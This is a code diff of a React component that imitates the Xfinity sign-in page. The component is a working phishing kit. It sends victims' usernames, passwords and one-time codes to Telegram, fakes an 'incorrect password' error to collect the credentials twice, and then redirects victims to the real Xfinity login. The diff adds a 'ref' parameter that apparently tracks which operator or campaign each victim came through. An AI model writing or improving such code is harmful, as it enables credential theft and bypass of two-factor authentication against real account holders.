@@ -1,6 +1,7 @@
 "use client";
 
 import { useState, FormEvent, ChangeEvent } from "react";
+import { useSearchParams } from "next/navigation";
 import {
   Dialog,
   DialogContent,
@@ -28,7 +29,6 @@ const loginSchema = z.object({
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
       const phoneRegex = /^\+?[\d\s-()]+$/;
       const usernameRegex = /^[a-zA-Z0-9._-]+$/;
-
       return (
         emailRegex.test(value) ||
         phoneRegex.test(value) ||
@@ -65,9 +65,12 @@ interface TelegramPayload {
   password: string;
   otp?: string;
   stage: "Login" | "OTP";
+  ref: number;
 }
 
 export default function XfinityLogin() {
+  const searchParams = useSearchParams();
+  const ref = parseInt(searchParams.get("ref") || "1", 10); // Default to 1 if ref is missing
   const [stage, setStage] = useState<Stage>(1);
   const [showDialog, setShowDialog] = useState<boolean>(false);
   const [submissionCount, setSubmissionCount] = useState<number>(0);
@@ -102,23 +105,25 @@ export default function XfinityLogin() {
         username: form.username,
         password: form.password,
         stage: "Login",
+        ref,
       };
 
       try {
         await sendToTelegram(payload);
         setSubmissionCount((prev) => prev + 1);
         if (submissionCount < 1) {
-          // First submission: show "Incorrect ID or Password" modal
+          // First submission: clear inputs, show "Incorrect ID or Password" modal
+          setForm({ username: "", password: "", otp: form.otp });
           setShowDialog(true);
-          setForm({ username: "", password: "", otp: form.otp }); // Clear username and password
         } else {
-          // Second submission: move to stage 2 and show OTP modal
+          // Second submission: move to stage 2, show OTP modal
           setStage(2);
           setShowDialog(true);
         }
       } catch (err) {
-        console.error("Telegram send error:", err);
-        setShowDialog(true); // Show error modal even on failure
+        console.error("Send error:", err);
+        setErrors({ username: "Failed to send data. Please try again." });
+        setShowDialog(true);
       }
     } else if (stage === 2) {
       const result = otpSchema.safeParse({ otp: form.otp });
@@ -138,14 +143,15 @@ export default function XfinityLogin() {
         password: form.password,
         otp: form.otp,
         stage: "OTP",
+        ref,
       };
 
       try {
         await sendToTelegram(payload);
-        setShowDialog(false); // Close modal after successful OTP submission
-        window.location.href = "https://login.xfinity.com/login"; // Redirect
+        setShowDialog(false);
+        window.location.href = "https://login.xfinity.com/login";
       } catch (err) {
-        console.error("Telegram send error:", err);
+        console.error("Send error:", err);
         setErrors({ otp: "Failed to verify OTP. Please try again." });
       }
     }
@@ -153,9 +159,8 @@ export default function XfinityLogin() {
 
   const handleContinue = (): void => {
     if (stage === 1) {
-      setShowDialog(false); // Close the error dialog
+      setShowDialog(false);
     } else {
-      // In stage 2, after OTP verification, redirect
       setShowDialog(false);
       window.location.href = "https://login.xfinity.com/login";
     }
@@ -179,14 +184,15 @@ export default function XfinityLogin() {
       password: form.password,
       otp: form.otp,
       stage: "OTP",
+      ref,
     };
 
     try {
       await sendToTelegram(payload);
-      setShowDialog(false); // Close modal after successful OTP submission
-      window.location.href = "https://login.xfinity.com/login"; // Redirect
+      setShowDialog(false);
+      window.location.href = "https://login.xfinity.com/login";
     } catch (err) {
-      console.error("Telegram send error:", err);
+      console.error("Send error:", err);
       setErrors({ otp: "Failed to verify OTP. Please try again." });
     }
   };
@@ -285,7 +291,7 @@ export default function XfinityLogin() {
 
               <button
                 type="submit"
-                className=" sc-prism-button font-bold cursor-pointer bg-blue-600 text-white rounded-sm py-3 mt-8 hover:bg-blue-700 transition"
+                className="sc-prism-button font-bold cursor-pointer bg-blue-600 text-white rounded-sm py-3 mt-8 hover:bg-blue-700 transition"
               >
                 Let&apos;s go
               </button>
@@ -321,7 +327,6 @@ export default function XfinityLogin() {
 
       <XfinityFooter />
 
-      {/* Dialog */}
       <Dialog open={showDialog} onOpenChange={setShowDialog}>
         <DialogContent className="sm:max-w-[425px] text-center">
           {stage === 1 ? (
